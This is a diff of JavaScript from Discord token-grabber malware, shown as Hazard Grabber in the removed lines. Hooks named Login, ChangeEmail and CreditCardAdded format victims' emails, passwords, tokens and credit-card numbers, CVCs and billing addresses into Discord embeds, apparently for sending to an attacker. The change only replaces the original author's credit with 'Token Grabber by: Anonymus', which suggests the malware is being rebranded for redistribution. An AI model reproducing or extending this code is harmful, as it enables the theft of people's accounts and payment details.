@@ -150,7 +150,7 @@ function Login(email, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Token Grabber by: Anonymus Discord: Anonymus"
                         }
                     }
                 ]
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Token Grabber by: Anonymus Discord: Anonymus"
                         }                
                     }
                 ]
@@ -311,7 +311,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                            "text": "Token Grabber by: Anonymus Discord: Anonymus"
                         }
                     }
                 ]
